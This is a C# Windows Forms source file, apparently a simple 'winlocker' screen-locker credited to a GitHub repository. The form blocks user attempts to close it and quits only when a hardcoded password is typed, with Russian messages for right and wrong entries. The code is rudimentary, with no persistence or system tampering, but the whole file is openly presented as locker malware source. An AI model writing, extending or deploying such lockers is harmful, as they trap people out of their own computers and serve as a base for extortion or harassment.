using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

//sources: https://github.com/marselshow/winlocker

namespace WinlockerCsharp
{
    public partial class Form1 : Form
    {
    

        public Form1()
        {
            InitializeComponent();
            
        }

        

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            switch (e.CloseReason)
            {
                case CloseReason.UserClosing:
                    e.Cancel = true;
                    break;
                    
            }

            base.OnFormClosing(e);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "csharpisbest!")
            {
                MessageBox.Show("Пароль верный!");
                Environment.Exit(0);
            }
            else
            {
                MessageBox.Show("Пароль неверный!");
                textBox1.Text = "НЕ ПРАВИЛЬНО!";
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
